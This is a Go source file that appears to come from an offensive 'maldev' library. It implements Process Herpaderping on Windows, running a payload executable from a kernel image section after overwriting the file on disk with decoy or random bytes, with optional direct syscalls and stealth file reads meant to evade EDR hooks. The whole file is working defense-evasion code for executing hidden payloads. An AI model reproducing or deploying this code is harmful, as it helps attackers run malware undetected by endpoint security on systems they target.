//go:build windows

package herpaderping

import (
	"crypto/rand"
	"fmt"
	"io"
	"os"
	"unsafe"

	"golang.org/x/sys/windows"

	"github.com/oioio-space/maldev/evasion/stealthopen"
	"github.com/oioio-space/maldev/win/api"
	wsyscall "github.com/oioio-space/maldev/win/syscall"
)

// Windows constants not in x/sys/windows.
const (
	secImage                    = 0x01000000
	sectionAllAccess            = 0x000F001F
	processBasicInformation     = 0
	rtlUserProcParamsNormalized = 0x01
)

// Config controls herpaderping execution.
type Config struct {
	// PayloadPath is the path to the PE to execute stealthily.
	PayloadPath string

	// TargetPath is the path where the PE will be written temporarily.
	// This file is overwritten with decoy content before thread creation.
	// If empty, a temp file is used.
	TargetPath string

	// DecoyPath is the path to a legitimate PE used to overwrite the target.
	// If empty, the target is overwritten with random bytes.
	DecoyPath string

	// Caller routes NT syscalls through direct/indirect methods to bypass
	// EDR hooks on NtCreateSection, NtCreateProcessEx, NtCreateThreadEx, etc.
	// nil = standard WinAPI (LazyProc.Call).
	Caller *wsyscall.Caller

	// Opener routes the payload + decoy reads through a stealth strategy
	// (typically *stealthopen.Stealth built for PayloadPath/DecoyPath) so
	// path-based EDR file hooks never observe the open. nil = standard
	// os.Open path read. The target-file create (CREATE_ALWAYS write) is
	// unchanged — the opener is a read-only abstraction.
	Opener stealthopen.Opener
}

// ntCall routes a call through the Caller if set, otherwise via api.ProcXxx.Call.
func ntCall(caller *wsyscall.Caller, name string, proc *windows.LazyProc, args ...uintptr) (uintptr, error) {
	if caller != nil {
		return caller.Call(name, args...)
	}
	r, _, _ := proc.Call(args...)
	if r != 0 {
		return r, fmt.Errorf("%s: NTSTATUS 0x%08X", name, uint32(r))
	}
	return 0, nil
}


// processBasicInfo mirrors PROCESS_BASIC_INFORMATION.
type processBasicInfo struct {
	ExitStatus                   uintptr
	PebBaseAddress               uintptr
	AffinityMask                 uintptr
	BasePriority                 int32
	_                            [4]byte // padding on x64
	UniqueProcessID              uintptr
	InheritedFromUniqueProcessID uintptr
}

// unicodeString mirrors UNICODE_STRING.
type unicodeString struct {
	Length        uint16
	MaximumLength uint16
	_             [4]byte // padding on x64
	Buffer        uintptr
}

// rtlUserProcessParameters mirrors a minimal RTL_USER_PROCESS_PARAMETERS.
type rtlUserProcessParameters struct {
	MaximumLength  uint32
	Length         uint32
	Flags          uint32
	DebugFlags     uint32
	ConsoleHandle  uintptr
	ConsoleFlags   uint32
	_              [4]byte
	StandardInput  uintptr
	StandardOutput uintptr
	StandardError  uintptr
	CurrentDirectory struct {
		DosPath unicodeString
		Handle  uintptr
	}
	DllPath       unicodeString
	ImagePathName unicodeString
	CommandLine   unicodeString
}

// Run executes a PE using the Process Herpaderping technique.
//
// How it works:
//  1. Writes the payload PE to the target path on disk
//  2. Creates an image section from the file (NtCreateSection + SEC_IMAGE)
//     -- this caches the payload in kernel memory
//  3. Creates a process object from the section (NtCreateProcessEx)
//  4. Overwrites the target file with decoy content (benign PE or random bytes)
//     -- security products now see the decoy, not the payload
//  5. Sets up process parameters (PEB, ImagePathName, CommandLine)
//  6. Creates the initial thread (NtCreateThreadEx)
//     -- this triggers EDR callbacks, but the file on disk is now benign
//
// The running process executes the original payload from kernel cache,
// while any file inspection shows the decoy content.
func Run(cfg Config) error {
	// Read payload (via Opener — stealth or standard)
	payload, err := stealthopen.OpenRead(cfg.Opener, cfg.PayloadPath)
	if err != nil {
		return fmt.Errorf("read payload: %w", err)
	}

	// Determine target path
	targetPath := cfg.TargetPath
	if targetPath == "" {
		tmp, tmpErr := os.CreateTemp("", "*.exe")
		if tmpErr != nil {
			return fmt.Errorf("create temp: %w", tmpErr)
		}
		targetPath = tmp.Name()
		tmp.Close()
	}

	// Step 1: Write payload to target file
	targetPathW, err := windows.UTF16PtrFromString(targetPath)
	if err != nil {
		return fmt.Errorf("utf16 target: %w", err)
	}

	hFile, err := windows.CreateFile(
		targetPathW,
		windows.GENERIC_READ|windows.GENERIC_WRITE,
		windows.FILE_SHARE_READ,
		nil,
		windows.CREATE_ALWAYS,
		windows.FILE_ATTRIBUTE_NORMAL,
		0,
	)
	if err != nil {
		return fmt.Errorf("create target file: %w", err)
	}
	autoTemp := cfg.TargetPath == ""
	succeeded := false
	defer func() {
		windows.CloseHandle(hFile)
		// Only delete on failure — on success the decoy file should remain on disk.
		if !succeeded && autoTemp {
			os.Remove(targetPath)
		}
	}()

	var written uint32
	if err := windows.WriteFile(hFile, payload, &written, nil); err != nil {
		return fmt.Errorf("write payload: %w", err)
	}

	// Step 2: Create image section from the file
	var hSection windows.Handle
	r, err := ntCall(cfg.Caller, "NtCreateSection", api.ProcNtCreateSection,
		uintptr(unsafe.Pointer(&hSection)),
		sectionAllAccess,
		0, // no object attributes
		0, // max size = file size
		windows.PAGE_READONLY,
		secImage,
		uintptr(hFile),
	)
	if r != 0 {
		return fmt.Errorf("NtCreateSection: %w", err)
	}
	defer windows.CloseHandle(hSection)

	// Step 3: Create process from the section
	var hProcess windows.Handle
	r, err = ntCall(cfg.Caller, "NtCreateProcessEx", api.ProcNtCreateProcessEx,
		uintptr(unsafe.Pointer(&hProcess)),
		windows.PROCESS_ALL_ACCESS,
		0, // no object attributes
		uintptr(windows.CurrentProcess()),
		0, // flags
		uintptr(hSection),
		0, // no debug port
		0, // no exception port
		0, // don't inherit handles
	)
	if r != 0 {
		return fmt.Errorf("NtCreateProcessEx: %w", err)
	}
	defer windows.CloseHandle(hProcess)

	// Step 4: Overwrite the file on disk with decoy content
	windows.SetFilePointer(hFile, 0, nil, 0)

	var decoyData []byte
	if cfg.DecoyPath != "" {
		decoyData, err = stealthopen.OpenRead(cfg.Opener, cfg.DecoyPath)
		if err != nil {
			return fmt.Errorf("read decoy: %w", err)
		}
	} else {
		// Fill with random bytes matching payload size
		decoyData = make([]byte, len(payload))
		if _, err := io.ReadFull(rand.Reader, decoyData); err != nil {
			return fmt.Errorf("generate random decoy: %w", err)
		}
	}

	if err := windows.WriteFile(hFile, decoyData, &written, nil); err != nil {
		return fmt.Errorf("write decoy: %w", err)
	}
	// Flush to ensure disk is updated before thread creation
	windows.FlushFileBuffers(hFile)

	// Step 5: Set up process parameters
	if err := setupProcessParameters(hProcess, targetPath, cfg.Caller); err != nil {
		return fmt.Errorf("setup params: %w", err)
	}

	// Step 6: Get the entry point and create the initial thread
	entryPoint, err := getEntryPoint(hProcess, payload, cfg.Caller)
	if err != nil {
		return fmt.Errorf("get entry point: %w", err)
	}

	var hThread windows.Handle
	r, err = ntCall(cfg.Caller, "NtCreateThreadEx", api.ProcNtCreateThreadEx,
		uintptr(unsafe.Pointer(&hThread)),
		api.ThreadAllAccess,
		0,
		uintptr(hProcess),
		entryPoint,
		0, // no argument
		0, // not suspended
		0, 0, 0, 0,
	)
	if r != 0 {
		return fmt.Errorf("NtCreateThreadEx: %w", err)
	}
	windows.CloseHandle(hThread)

	succeeded = true
	return nil
}

// setupProcessParameters creates RTL_USER_PROCESS_PARAMETERS and writes
// them to the target process PEB.
func setupProcessParameters(hProcess windows.Handle, imagePath string, caller *wsyscall.Caller) error {
	imagePathW, err := windows.UTF16PtrFromString(imagePath)
	if err != nil {
		return fmt.Errorf("utf16 image path: %w", err)
	}

	// Initialize UNICODE_STRING for the image path
	var imagePathUS unicodeString
	api.ProcRtlInitUnicodeString.Call(
		uintptr(unsafe.Pointer(&imagePathUS)),
		uintptr(unsafe.Pointer(imagePathW)),
	)

	// Create process parameters
	var pParams uintptr
	r, _, _ := api.ProcRtlCreateProcessParametersEx.Call(
		uintptr(unsafe.Pointer(&pParams)),
		uintptr(unsafe.Pointer(&imagePathUS)), // ImagePathName
		0, // DllPath
		0, // CurrentDirectory
		uintptr(unsafe.Pointer(&imagePathUS)), // CommandLine = image path
		0, // Environment
		0, // WindowTitle
		0, // DesktopInfo
		0, // ShellInfo
		0, // RuntimeData
		rtlUserProcParamsNormalized,
	)
	if r != 0 {
		return fmt.Errorf("RtlCreateProcessParametersEx: NTSTATUS 0x%08X", uint32(r))
	}

	// Get PEB address from target process
	var pbi processBasicInfo
	var retLen uint32
	r, err = ntCall(caller, "NtQueryInformationProcess", api.ProcNtQueryInformationProcess,
		uintptr(hProcess),
		processBasicInformation,
		uintptr(unsafe.Pointer(&pbi)),
		uintptr(unsafe.Sizeof(pbi)),
		uintptr(unsafe.Pointer(&retLen)),
	)
	if r != 0 {
		return fmt.Errorf("NtQueryInformationProcess: %w", err)
	}

	// ProcessParameters pointer offset in PEB (offset 0x20 on x64)
	paramsPtrAddr := pbi.PebBaseAddress + 0x20

	// Get the size of the parameters
	params := (*rtlUserProcessParameters)(unsafe.Pointer(pParams))
	paramsSize := uintptr(params.MaximumLength)

	// Allocate memory in target process for the parameters
	var remoteParams uintptr
	r, err = ntCall(caller, "NtAllocateVirtualMemory", api.ProcNtAllocateVirtualMemory,
		uintptr(hProcess),
		uintptr(unsafe.Pointer(&remoteParams)),
		0,
		uintptr(unsafe.Pointer(&paramsSize)),
		windows.MEM_COMMIT|windows.MEM_RESERVE,
		windows.PAGE_READWRITE,
	)
	if r != 0 {
		return fmt.Errorf("NtAllocateVirtualMemory (params): %w", err)
	}

	// Write parameters to remote process
	var bytesWritten uintptr
	if err := windows.WriteProcessMemory(
		hProcess,
		remoteParams,
		(*byte)(unsafe.Pointer(pParams)),
		paramsSize,
		&bytesWritten,
	); err != nil {
		return fmt.Errorf("WriteProcessMemory (params): %w", err)
	}

	// Update PEB.ProcessParameters pointer to point to remote allocation
	if err := windows.WriteProcessMemory(
		hProcess,
		paramsPtrAddr,
		(*byte)(unsafe.Pointer(&remoteParams)),
		unsafe.Sizeof(remoteParams),
		&bytesWritten,
	); err != nil {
		return fmt.Errorf("WriteProcessMemory (PEB): %w", err)
	}

	return nil
}

// getEntryPoint reads the PE headers from the payload to find the entry point,
// then adds the process image base to get the absolute address.
func getEntryPoint(hProcess windows.Handle, payload []byte, caller *wsyscall.Caller) (uintptr, error) {
	// Get the image base from the process PEB
	var pbi processBasicInfo
	var retLen uint32
	r, err := ntCall(caller, "NtQueryInformationProcess", api.ProcNtQueryInformationProcess,
		uintptr(hProcess),
		processBasicInformation,
		uintptr(unsafe.Pointer(&pbi)),
		uintptr(unsafe.Sizeof(pbi)),
		uintptr(unsafe.Pointer(&retLen)),
	)
	if r != 0 {
		return 0, fmt.Errorf("NtQueryInformationProcess: %w", err)
	}

	// Read ImageBaseAddress from PEB (offset 0x10 on x64)
	imageBaseAddr := pbi.PebBaseAddress + 0x10
	var imageBase uintptr
	var bytesRead uintptr
	if err := windows.ReadProcessMemory(
		hProcess,
		imageBaseAddr,
		(*byte)(unsafe.Pointer(&imageBase)),
		unsafe.Sizeof(imageBase),
		&bytesRead,
	); err != nil {
		return 0, fmt.Errorf("ReadProcessMemory (image base): %w", err)
	}

	// Parse PE headers from the payload bytes to get AddressOfEntryPoint
	if len(payload) < 64 {
		return 0, fmt.Errorf("payload too small for PE header")
	}
	eLfanew := *(*int32)(unsafe.Pointer(&payload[0x3C]))
	if int(eLfanew)+4+20+16+4 > len(payload) {
		return 0, fmt.Errorf("invalid PE header offset")
	}
	// PE signature at e_lfanew, then COFF header (20 bytes), then optional header
	// AddressOfEntryPoint is at offset 16 in the optional header
	optionalHeaderOffset := int(eLfanew) + 4 + 20 // PE sig(4) + COFF(20)
	addressOfEntryPoint := *(*uint32)(unsafe.Pointer(&payload[optionalHeaderOffset+16]))

	return imageBase + uintptr(addressOfEntryPoint), nil
}
